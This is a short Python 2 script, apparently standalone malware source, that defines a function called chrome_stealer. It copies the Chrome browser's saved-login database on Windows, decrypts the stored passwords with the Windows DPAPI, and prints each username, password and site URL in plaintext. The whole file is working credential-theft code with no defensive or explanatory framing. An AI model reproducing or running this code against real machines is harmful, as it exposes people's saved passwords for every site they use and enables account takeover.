#coding:utf-8

import os
import shutil
import sqlite3
import win32crypt

def chrome_stealer():
    list = []
    db_file_path = os.path.join(os.environ['LOCALAPPDATA'], r'Google\Chrome\User Data\Default\Login Data')
    tmp_file = os.path.join(os.getcwd(), 'TtMmPp')
    if os.path.exists(tmp_file):
        os.remove(tmp_file)
    #复制到一个临时目录，防止文件上锁打不开
    shutil.copyfile(db_file_path, tmp_file)
    conn = sqlite3.connect(tmp_file)
    for row in conn.execute('select username_value, password_value, signon_realm from logins'):
        try:
            ret = win32crypt.CryptUnprotectData(str(row[1]), None, None, None, 0)
        except:
            print '[*] Mission Failed'
            conn.close()
            exit(-1)
        content = 'UserName: {0:<20};Password: {1:<20};URL: {2}'.format(row[0].encode('gbk'), ret[1].encode('gbk'), row[2].encode('gbk'))
        list.append(content)
    conn.close()
    os.remove(tmp_file)
    return list

print chrome_stealer()